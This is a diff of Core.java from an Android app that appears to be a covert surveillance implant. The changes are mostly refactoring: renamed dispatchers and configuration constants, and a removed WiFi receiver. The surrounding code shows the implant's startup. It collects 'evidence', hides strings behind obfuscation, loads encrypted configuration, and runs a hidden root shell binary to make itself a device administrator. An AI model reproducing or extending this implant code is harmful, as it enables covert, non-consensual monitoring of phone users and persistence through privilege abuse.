@@ -14,10 +14,7 @@ import android.app.ActivityManager;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.IntentFilter;
 import android.content.res.Resources;
-import android.net.ConnectivityManager;
-import android.net.wifi.WifiManager;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
@@ -36,7 +33,6 @@ import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.gui.ASG;
 import com.android.dvci.listener.BSm;
-import com.android.dvci.listener.WR;
 import com.android.dvci.manager.ManagerEvent;
 import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.optimize.NetworkOptimizer;
@@ -163,14 +159,6 @@ public class Core extends Activity implements Runnable {
 			wl.acquire();
 		}
 
-		// WiFi status manager
-		IntentFilter intentFilter = new IntentFilter();
-		intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
-		intentFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
-
-		WR wifiReceiver = new WR();
-		Status.getAppContext().registerReceiver(wifiReceiver, intentFilter);
-
 		EvidenceBuilder.info(M.e("Started")); //$NON-NLS-1$
 
 		serviceRunning = true;
@@ -236,7 +224,7 @@ public class Core extends Activity implements Runnable {
 				String pack = Status.self().getAppContext().getPackageName();
 				String bd = Configuration.shellFile + M.e(" adm");
 				String tbe = String.format("%s %s/%s", bd, pack,  M.e(".listener.AR"));
-				// /system/bin/ntpsvd adm
+				// /system/bin/ddf adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
 
@@ -479,6 +467,7 @@ public class Core extends Activity implements Runnable {
 			// Identify the device uniquely
 			final Device device = Device.self();
 
+            // load configuration
 			int ret = loadConf();
 
 			if (ret == 0) {
@@ -489,14 +478,14 @@ public class Core extends Activity implements Runnable {
 				return ConfType.Error;
 			}
 
-			// Start log dispatcher
-			final EvDispatcher logDispatcher = EvDispatcher.self();
+			// Start event dispatcher
+			final EvDispatcher evDispatcher = EvDispatcher.self();
 
-			if (!logDispatcher.isRunning()) {
+			if (!evDispatcher.isRunning()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (taskInit), start evDispatcher");
 				}
-				logDispatcher.start();
+				evDispatcher.start();
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (taskInit), evDispatcher already started ");
@@ -602,7 +591,7 @@ public class Core extends Activity implements Runnable {
 			} else {
 				// 30_3=New configuration activated
 				EvidenceBuilder.info(M.e("New configuration activated")); //$NON-NLS-1$
-				file.rename(Path.conf() + ConfType.ActualConf);
+				file.rename(Path.conf() + ConfType.CurrentConf);
 				ret = ConfType.NewConf;
 			}
 		}
@@ -610,9 +599,9 @@ public class Core extends Activity implements Runnable {
 		// get the actual configuration
 		if (!loaded) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (loadConf): TRY ACTUALCONF");
+				Check.log(TAG + " (loadConf): TRY CURRENTCONF");
 			}
-			file = new AutoFile(Path.conf() + ConfType.ActualConf);
+			file = new AutoFile(Path.conf() + ConfType.CurrentConf);
 
 			if (file.exists()) {
 				loaded = loadConfFile(file, true);
@@ -621,7 +610,7 @@ public class Core extends Activity implements Runnable {
 					// Actual configuration corrupted
 					EvidenceBuilder.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
 				} else {
-					ret = ConfType.ActualConf;
+					ret = ConfType.CurrentConf;
 				}
 			}
 		}
@@ -653,7 +642,7 @@ public class Core extends Activity implements Runnable {
 		// tries to load the resource conf
 		if (!loaded) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (loadConf): TRY RESCONF");
+				Check.log(TAG + " (loadConf): TRY ASSET CONF");
 			}
 			// Open conf from resources and load it into resource
 			final byte[] resource = Utils.getAsset(M.e("c.bin")); // config.bin
